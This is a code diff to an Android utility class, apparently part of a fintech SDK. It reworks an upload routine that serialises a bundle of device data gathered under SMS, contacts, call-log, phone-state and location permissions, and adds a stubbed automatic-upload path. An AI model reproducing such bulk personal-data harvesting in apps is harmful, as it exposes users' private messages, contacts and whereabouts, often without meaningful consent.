@@ -11,6 +11,11 @@ import com.fintek.utils_androidx.network.MediaType.Companion.toMediaType
 import com.fintek.utils_androidx.network.Request
 import com.fintek.utils_androidx.network.RequestBody
 import com.fintek.utils_androidx.network.RequestBody.Companion.toRequestBody
+import com.fintek.utils_androidx.upload.internal.*
+import com.fintek.utils_androidx.upload.internal.ExistedStringElement
+import com.fintek.utils_androidx.upload.internal.IS_EXISTED
+import com.fintek.utils_androidx.upload.internal.StringElement
+import com.fintek.utils_androidx.upload.internal.elementDelete
 import com.google.gson.Gson
 import java.util.concurrent.TimeUnit
 
@@ -26,6 +31,9 @@ object UploadUtils {
 
     /**
      * Upload all struct to Service
+     *
+     *
+     * This way will delete all cache file
      * @param url request api url
      */
     @JvmStatic
@@ -37,15 +45,47 @@ object UploadUtils {
         Manifest.permission.INTERNET
     ])
     @RequiresApi(Build.VERSION_CODES.KITKAT)
-    fun upload(url: String) {
+    fun upload() {
+        elementDelete()
+
+        // create new struct json
+        val element: Element<String> = StringElement(createNewStructJson())
+    }
+
+
+    @RequiresPermission(anyOf = [
+        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
+        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
+        Manifest.permission.INTERNET
+    ])
+    @RequiresApi(Build.VERSION_CODES.KITKAT)
+    internal fun autoUpload() {
+        if (!IS_EXISTED) {
+            return
+        }
+
+        val element: Element<String> = ExistedStringElement()
+        if (IS_UPLOADING) {
+            val cacheElement: String? = element.cache()
+            // TODO: 2020/12/16 upload cache here
+        } else {
+            val nextElement: String = element.next()
+            // TODO: 2020/12/16 upload next here
+        }
+    }
+
+    @RequiresPermission(anyOf = [
+        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
+        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
+        Manifest.permission.INTERNET
+    ])
+    @RequiresApi(Build.VERSION_CODES.KITKAT)
+    private fun createNewStructJson(): String {
         val struct = FintekUtils.getAllStruct()
-        val structJson = Gson().toJson(struct)
-
-
-//        UtilsBridge.writeFileFromString(
-//            filePath = ,
-//            content = ,
-//            append = true
-//        )
+        return Gson().toJson(struct)
     }
 }
